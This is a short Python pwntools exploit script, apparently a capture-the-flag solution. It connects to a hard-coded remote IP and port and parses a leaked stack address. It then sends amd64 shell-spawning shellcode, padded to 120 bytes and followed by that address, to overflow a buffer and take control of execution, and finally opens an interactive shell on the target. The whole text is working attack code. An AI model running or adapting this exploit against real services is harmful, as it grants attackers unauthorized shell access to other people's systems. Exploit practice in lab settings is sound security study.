#!/usr/bin/env python

from pwn import *


r = remote('159.65.140.117', 5003)
#r = remote('140.110.112.29', 2115)
#r = process('./shellcode')
context.arch = 'amd64'
context.log_level = 'debug'


addr = p64(int(r.recvuntil('\n')[-16:].strip(), 16))

shellcode = asm(shellcraft.amd64.linux.sh())
payload = ''
payload = shellcode + 'a'*(120 - len(shellcode)) + addr

print '[+] payload :', payload
print len(payload)
r.sendline(payload)
r.interactive()
